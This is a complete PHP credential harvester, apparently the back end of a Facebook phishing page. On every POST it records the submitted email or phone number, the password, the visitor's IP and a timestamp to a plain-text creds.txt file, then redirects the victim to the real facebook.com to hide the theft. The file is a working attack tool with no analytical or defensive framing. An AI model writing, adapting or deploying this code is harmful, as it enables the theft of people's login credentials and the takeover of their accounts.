<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email_phone = $_POST['email_phone'] ?? '[empty]';
    $password = $_POST['password'] ?? '[empty]';

    $log_entry = sprintf(
        "[%s] IP: %s | Email/Phone: %s | Password: %s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $email_phone,
        $password
    );
    
    $log_file = __DIR__ . '/creds.txt';
    if (file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX) === false) {
        error_log("Failed to write credentials to " . $log_file);
    }
    header("Location: https://www.facebook.com/");
    exit();
}
header("Location: https://www.facebook.com/");
exit();
?>
